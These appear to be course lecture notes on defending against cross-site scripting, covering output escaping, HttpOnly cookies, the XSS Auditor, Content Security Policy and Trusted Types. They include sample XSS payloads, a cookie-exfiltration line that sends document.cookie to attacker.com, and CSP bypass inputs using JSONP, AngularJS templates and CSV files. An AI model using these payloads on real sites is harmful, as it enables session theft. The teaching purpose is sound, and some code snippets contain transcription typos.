### XSS Defenses

XSS is user data combining with code.With crafted input code it can run and produce a resulting page that can run the attackers code.We want to escape input and treat as user input not as code.

### Review: Cross-Site Scripting
- HTML template:
`<p>USER_DATA_HERE</p>`
- User input:
```HTML
<script>alert(document.cookie)</script>
```
- Resulting page (without escaping):
```HTML
<p><script>alert(document.cookie)</script></p>
```
- Resulting page (with escaping):
```HTML
<p>&lt;script>alert(document.cookie)&lt;/script></p
```
- In reflected XSS, the attack code is placed into the HTTP request itself
    - Attacker goal: find a URL that you can make target visit that includes your attack code
    - Limitation: Attack code must be added to the URL path or query parameters
- In stored XSS, the attack code is persisted into the database
    - Attacker goal:Use any means to get attack code into the database
    - Once there, server includes it in all pages sent to clients

### Injecting down vs. injecting up
- Injecting down: Create a new nested context
- Injecting up: End the current context to go to a higher context
```HTML
<p>USER_DATA_HERE</p>
<p><script>alert(document.cookie)</script></p>
```

### XSS defenses
- Remember: Code injection is caused when untrusted user dataunexpectedly becomes code
- A better name for Cross Site Scripting would be "HTML Injection"
- Goal: need to "escape" or "sanitize" user input before combining it with code (the HTML template)

### Where untrusted data comes from 
- HTTP request from user
    - Query parameters, form fields, headers, cookies, file uploads
- Data from a database
    - Who knows how the data got into the database? Do not trust.
- Third-party services
    - Who knows if it's safe?
    - Even if it is, what if the service gets hacked and starts sending unsafe data?

### When to escape?
- On the way into the database, or on the way out at render time?
    - Always: on the way out, at render time
- Why?
    - Even if you are sure that you control all possible ways for data to get into the database, you don't know in advance what context the data will appear in
    - Different contexts have different "control characters" (characters that need to be escaped)

### How to escape user input?
- Use your framework's built-in HTML escaping functionality
    - Linus's Law: "Given enough eyeballs, all bugs are shallow"
    - If/when bugs are found, you'll get the fix for free!
- Also, make sure you know the contexts where it is safe to use the output
    - e.g. don't use an HTML escaping function and put the output into a <script> tag or an HTML comment


### Escaping with EJS
- EJS template:
```EJS
<% if (user) { %>
    <h2><%=user.name %></h2>
<% } %>
```
- Server code:
`res.render('template-name', { user })`

### Case study: React
- The obvious path escapes the HTML:
```JS
const html = '<h1>Hi</h1>'
const jsx = <div>{html}</div>
```

- The expected solution doesn't work either:
```JS
const html = '<h1>Hi</h1>'
const jsx = <divinnerHTML={html} />
```
- This is the solution in React:
```HTML
const html = '<h1>Hi</h1>'
const jsx = <divdangerouslySetInnerHTML={{ __html:html }} />
```
- Key idea: Dangerous code should look dangerous!
- Goal: Everyone who looks at this code should be like "gross, can we refactor this to not need dangerouslySetInnerHTML?" and/or scrutinize the code very closely

•   Another amusing example from React:
`React.__SECRET_DOM_DO_NOT_USE_OR_YOU_WILL_BE_FIRED`

### EJS has many confusing tag prefixes
Even though EJS is easy to use it increases the chances of causing an error and eventually a XSS.

- <% 'Scriptlet' tag, for control-flow, no output
- <%_ ‘Whitespace Slurping’ Scriptlet tag, strips all whitespace before it
- <%= Outputs the value into the template (HTML escaped)
- <%- Outputs the unescaped value into the template
- <%# Comment tag, no execution, no output
- <%% Outputs a literal '<%'
- %> Plain ending tag
- -%> Trim-mode ('newline slurp') tag, trims following newline
- _%> ‘Whitespace Slurping’ ending tag, removes all whitespace after it

### Realization: XSS is going to happen
- XSS is one of the most common vulnerabilities
- What if we accept that XSS will happen to our site?
- How can we defend our site's users even in the presence of XSS?
    - Remember: With XSS, attacker code is running in the same page as the user's data (cookies, other private data)
    - This seems like a tall order!

### Key idea: Defense-in-depth
- Goal: Provide redundancy in case security controls fail, or a vulnerability is exploited
- Attacker now has to find multiple exploitable vulnerabilities in order to produce a successful attack
- What are some examples of defense-in-depth you've encountered?
    - Set a strong password + two-factor authentication
    - Plus: email notifications which act as an audit log

### Defending the user's cookies
- Use HttpOnly cookie attribute to prevent cookie from being read from JavaScript in the user's browser
` Set-Cookie: key=value; HttpOnly`
- HttpOnly defeats this attack code:
    `new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie`
- Note: This restriction applies to JavaScript from the site author too!

### XSS Auditor
- Introduced in Chrome 4 in 2010
- Runs during the HTML parsing phase and attempts to find reflections from the request to the response body
    - Does not attempt to mitigate Stored XSS or DOM-based XSS
- Sounds pretty useful, right?
- Chrome realized it was a bad idea and removed in Chrome 78 in 2019

### XSS Auditor's many problems
- False negatives: Lots of ways to bypass it
- False positives: No way of knowing whether a given script block which appears in both the request and the response was truly reflected from the request to the response
- Take a page which contains `<script>alert('hi')</script>`
    - If user visits page normally, Auditor does not trigger
    - If user visits page with query string `?query=<script>alert('hi')</script>` then Auditor concludes this is an XSS attack!

### Demo: Sniping code out of a page
- Say target.com contains some inconvenient code:
```HTML
<script>if (window.top.location != window.location)
window.top.location = window.location</script>
```
- Then attacker.com can frame the page and make it look like a Reflected XSS:
```HTML
<iframe src='http://target.com:4000/?query=%3Cscript%3Eif%20
(window.top.location%20!=%20window.location)%20window.top.
location%20=%20window.location%3C/script%3E'></iframe>
```
The XSS Auditor will helpfully remove the matching script from the page!

### Sniping an external script
- Target page:
```HTML
<!doctype html>
<h1>Hi</h1>
<scriptsrc='/security.js'></script>
<script>
        // assumes that the libraries are included
</script>
- Security script can be sniped out with:
```HTML
<iframe src='http://target.com/?query=
%3Cscript%20src=%27/security.js%27%3E%3C/script%3E'></iframe>
```

### Content Security Policy (CSP)
- Previously, we talked about ways to tighten up Same Origin Policy in terms of which sites could e.g. post forms to our site, or load images, scripts, or styles from our site
    - That is, preventing other sites from making requests to our site
- CSP is inverse: prevent our site from making requests to other sites
- CSP is an added layer of security against XSS
    - Even if attacker code is running in user's browser in our site's context, we can limit the damage they can do

### The Content-Security-PolicyHTTP header
- Add the Content-Security-Policy header to an HTTP response to control the resources the page is allowed to load
- CSP blocks HTTP requests which would violate the policy

### Goal: Content comes from our site
`Content-Security-Policy:default-src'self'`
- Is <script src='/hello.js></script> allowed?
>Yes, relative URLs are loaded from the same origin
- Is <script src='https://other.com/script.js'></script> allowed?
>No, script comes from a different origin
- Is <script>alert('hello')</script> allowed?
>No, inline scripts are prevented. Strong protection against XSS!
Is <div onmouseover='foo()'></div> allowed?
- No, inline scripts are prevented. Strong protection against XSS!


### Goal: Content comes from our site, plus a trusted set of subdomains

```HTMLContent-Security-Policy:
    default-src'self'*.trusted.com
```
### Example: Web mail provider
- Goal: Allow resources from our site, including our subdomains, but block resources from anywhere else. Also, allow images to come from anywhere.

```
Content-Security-Policy:
    default-src'self'*.mailsite.com;
        img-src*
```
- Assuming session cookie is not HttpOnly, can it be exfiltrated?
    - Much harder! Can't use <script>ATTACK CODE</script> or load script from external site!
    - In theory, still possible though. How?

### Deploy CSP on an existing site
- Problem: How do we figure out what the policy should be? What if we miss something? Site breaks!
- Solution: Deploy it in report-only mode
```
Content-Security-Policy-Report-Only:policy
```
- Policy is not enforced, but violations are reported to a provided URL

### CSP fetch directives
- default-src - Serves as a fallback for other fetch directives
- connect-src - Restricts sources from "script interfaces": fetch, XHR, WebSocket, EventSource, Nagivator.sendBeacon(), <a ping>
- font-src Restricts sources for fonts
- frame-src - Restricts sources for nested browsing contexts: <frame>, <iframe>
- img-src - Restricts sources for images, favicons
- manifest-src - Restricts sources for app manifest files
- media-src - Restricts sources for media: <audio>, <video>, <track>
- object-src - Restricts legacy plugins: <object>, <embed>, and <applet>
- script-src - Restricts sources for <script> elements
- style-src - Restricts sources for <style> and <link rel='stylesheet'> elements
- worker-src - Restricts sources for Worker, SharedWorker, and ServiceWorker

### Other CSP directives
***Note: These directives not inherit from default-src. If left unspecified, they allow everything!***
- base-uri - Restricts URLs which can be used in <base>
- form-action - Restricts URLs which can be used as target of form submission
- frame-ancestors - Restricts parents which may embed this page using <frame>, <iframe>
- navigate-to - Restricts the URLs to which a document can initiate navigation by any means
- upgrade-insecure-requests - Instruct browser to treat all HTTP URLs as the HTTPS equivalent transparently

### script-src blocks inline scripts
- Most XSS attacks use inline scripts
- Use 'unsafe-inline' to allow inline scripts, but this is basically equivalent to having no CSP!
    - It allows any inline <script> tag to execute!
- Better solution would be to move the code to /script.js hosted on our own site (which is an allowed script source by script-src)

### When theory meets reality
```HTML
<script>
    window.GoogleAnalyticsObject = 'ga'
    function ga () { window.ga.q.push(arguments) }
    window.ga.q = window.ga.q || []
    window.ga.l = Date.now()
    window.ga('create', 'UA-XXXXXXX-XX', 'auto')
    window.ga('send', 'pageview')
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>
```
```
Content-Security-Policy:  
    default-src:'self';  
    img-src:'self'https://www.google-analytics.com;  
    script-src:'self'https://www.google-analytics.com'unsafe-inline'
```
- Finally works, but it's fragile! What if they start sending data to another domain?

Solution:
```
Content-Security-Policy:
    default-src:'self';  
    img-src:*;  
    script-src:'self'https://www.google-analytics.com'unsafe-inline'
```
- Still fragile, what if the script includes a script from another domain?

### Scripts on scripts on scripts...
- Script could do something like this (in fact it used to!):
```Javascript
const script = document.createElement('script')
script.src = 'https://ssl.google-analytics.com/script.js'
document.body.appendChild(script)
```
- How do we ensure CSP never breaks the site, even when new scripts are added?
    - Propagate trust from the initial script (which we trust) to any scripts it includes at runtime (which we want to implicitly trust) no matter where that script comes from

**Look at the CSP is dead lonf live CSP!** paper by the google folks.

### "CSP is Dead" findings
- "14 out of the 15 domains most commonly whitelisted for loading scripts contain unsafe endpoints; as a consequence, 75.81% of distinct policies use script whitelists that allow attackers to bypass CSP"
- "94.68% of policies that attempt to limit script execution are ineffective"
- "99.34% of hosts with CSP use policies that offer no benefit against XSS"

### JavaScript with user-controlled callbacks
- Attack input:
```HTML
<script src='/api/jsonp?callback=alert(document.cookie)//'></script>
```
- Server response:
`alert(document.cookie)//{"var": "data", ...});`

### Symbolic execution
- Typical AngularJS code:
```HTML
<script src='https://allowed.com/angular.js'></script>
<div ng-app>{{ 9000 + 1 }}</div>
```
- AngularJS parses templates and executes them
- Therefore, the ability to control templates parsed by Angular is equivalent to executing arbitrary JavaScript
- Replace {{ 9000 + 1 }} with {{ alert(document.cookie) }}

### Unexpected JavaScript-parseable responses
- Error messages echoing request parameters:
`Error: alert(document.cookie)// not found.`
- Attack input:
`<script src='/alert(document.cookie)%2F%2F'></script>`

### Unexpected JavaScript-parseable responses
- Comma-separated value (CSV) data with partiallyattacker-controlled contents:
```Name,Value
alert(document.cookie),234
```
- Attack input:
`<script src='/file.csv?q=alert(document.cookie)'></script>`

### Useless CSP
- "CSP is notoriously tricky to get right, but some people aren't even trying and are likely adding headers to tick a box on their assessment report."
- "Most of them are listed on this website because of their usage of 'unsafe-inline' and 'unsafe-eval' in the script-srcpart"

### Introducing strict-dynamic
- Server sends:
`Content-Security-Policy:script-src 'strict-dynamic' 'nonce-abc123'`
```HTML
<script src='https://trusted.com' nonce='abc123'></script>
<script nonce='abc123'>foo()</script>
```
- "Specifies that the trust explicitly given to a script present in the markup, by accompanying it with a nonce, shall be propagated to all the scripts loaded by that root script"
- No need to specify a whitelist anymore!

- Server sends:
`Content-Security-Policy:script-src 'strict-dynamic' 'nonce-abc123'`
```HTML
<scriptsrc='https://trusted.com' nonce='abc123'>
</script><scriptsrc='https://attacker.com/evil.js'>
</script><script>alert(document.cookie)</script>
```
- Attacker can't figure out the nonce. Why?
    - Nonce changes on each page load, and is unpredictable
    - Attacker can't inspect the DOM to read the nonce unless they're already running JavaScript

- "When strict-dynamic is included, any whitelist or source expressions such as 'self' or 'unsafe-inline' will be ignored"
- So, just keep the full list of allowed origins in there as a fallback in unsupported browsers.
- Or, just keep it simple
```
Content-Security-Policy:
script-src 'strict-dynamic' 'nonce-NONCE_GOES_HERE'
*'unsafe-inline';
```

### Reasonable "starter" CSP header
```HTML
Content-Security-Policy:
    default-src 'self' data:;
    img-src *;
    object-src 'none';
    script-src 'strict-dynamic' 'nonce-NONCE_GOES_HERE'
      *'unsafe-inline';
    style-src 'self' 'unsafe-inline';
    base-uri 'none';
    frame-ancestors 'none';
    form-action 'self'
```

### Feature-Policy HTTP header
- Selectively disable browser features
    - autoplay
    - geolocation
    - picture-in-picture
    - vertical-scroll
-  Hopefully many more shipping soon
accelerometer, ambient-light-sensor, camera, document-domain,document-write, encrypted-media, focus-without-user-activation,font-display-late-swap, fullscreen, gyroscope, layout-animations,lazyload, loading-frame-default-eager, magnetometer, microphone,midi, payment, unoptimized-lossless-images,unoptimized-lossless-images-strict, usb, vr

### DOM-based XSS
- Assume DOM is modified by valid script running in the browser
- Attacker tricks this script into adding attacker DOM nodes into page
- Unlike reflected or stored XSS, the attacker doesn't change the HTML rendered by the server. Instead, page is attacked at "runtime"

```Javascript
const data = await fetch('/api/bio?user=shagun')
document.getElementById('bio').innerHTML = data
```
- Solution: Instead of innerHTML, use textContent

### Trusted Types
- CSP only protects against Reflected XSS and Stored XSS
- What about DOM-based XSS?
```Javascript
const data = await fetch('/api/bio?user=feross')
document.getElementById('bio').innerHTML = data
```
- There's a new web spec called "Trusted Types" that if deployed in browsers would completely eliminate most DOM-based XSS

`Content-Security-Policy: trusted-types template`

### Important Points
-  XSS vulnerabilities are pervasive in real-world sites – be vigilant!
-  Never trust data from the client – always sanitize it!
-  Be aware of the context you're including user data in – escape it appropriately!
-  Use CSP and (soon) Trusted Types to prevent nearly all XSS!
-  You can never be too paranoid

### Further Reading
http://research.sidstamm.com/papers/csp-www2010.pdf

https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf

https://developers.google.com/web/updates/2019/02/trusted-types

https://fastmail.blog/2015/12/20/sanitising-html-the-dom-clobbering-issue/

